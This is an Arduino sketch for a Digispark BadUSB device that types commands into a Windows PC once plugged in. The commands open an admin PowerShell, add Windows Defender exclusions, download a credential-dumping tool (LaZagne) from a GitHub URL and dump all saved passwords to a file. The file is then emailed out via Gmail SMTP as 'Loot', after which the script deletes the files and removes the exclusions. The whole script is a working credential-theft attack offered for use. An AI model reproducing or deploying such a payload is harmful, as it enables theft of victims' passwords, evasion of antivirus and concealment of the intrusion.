
#include "DigiKeyboardDe.h"

void setup() {
  pinMode(1, OUTPUT); // on-board led for model A
}

void loop() {
  
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  DigiKeyboardDe.println("powershell -exec bypass -command \"mode con cols=20 lines=1\""); // cols 20 or IWR won't work...
  DigiKeyboard.delay(2000);
  DigiKeyboardDe.println(F("$p = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'; $q = $env:localappdata;"));
  DigiKeyboard.delay(3000);
  DigiKeyboardDe.println("Add-MpPreference -ExclusionPath $p, $q");
  DigiKeyboard.delay(1000);
  DigiKeyboardDe.println("cd $q");
  DigiKeyboard.delay(1000);
  DigiKeyboardDe.println("IWR -uri 'https://raw.githubusercontent.com/hacknsec/digispark/main/Tools/lazagne.exe' -OutFile 'cred.exe';"); // Official binary is outdated - edit to use your own
  DigiKeyboard.delay(30000); // Wait for download to finish
  DigiKeyboardDe.println("./cred.exe all > cred.txt");
  DigiKeyboard.delay(300000); // Cancel after 5 mins
  DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT, KEY_C); 
  DigiKeyboard.delay(100);
  DigiKeyboardDe.println(F("$SMTPServer = 'smtp.gmail.com'; $smtp = New-Object Net.Mail.SmtpClient($SmtpServer, 587); $smtp.EnableSsl = $true;"));
  DigiKeyboard.delay(3000);
  DigiKeyboardDe.println(F("$smtp.Credentials = New-Object System.Net.NetworkCredential('<EMAIL>', '<PASSWORD>'); $hostname = hostname;"));
  DigiKeyboard.delay(3000);
  DigiKeyboardDe.println(F("$attach = New-Object System.Net.Mail.Attachment(\"$env:localappdata\\cred.txt\"); $Mail = New-Object System.Net.Mail.MailMessage;"));
  DigiKeyboard.delay(3000);
  DigiKeyboardDe.println(F("$Mail.From = '<EMAIL>'; $Mail.To.Add('<EMAIL>'); $Mail.Subject = \"Loot from \"+\"$hostname\";"));
  DigiKeyboard.delay(3000);
  DigiKeyboardDe.println(F("$Mail.Body = \"Enjoy!\"; $Mail.Attachments.Add($attach); $smtp.Send($Mail);"));
  DigiKeyboard.delay(15000);
  DigiKeyboardDe.println("del cred*");
  DigiKeyboard.delay(1000);
  DigiKeyboardDe.println("Remove-MpPreference -ExclusionPath $p, $q");
  DigiKeyboard.delay(1000);
  DigiKeyboardDe.println("exit");
  DigiKeyboard.delay(500);
  
  digitalWrite(1, HIGH); // LED indicator, ready to remove
  DigiKeyboard.delay(900000);
  
}
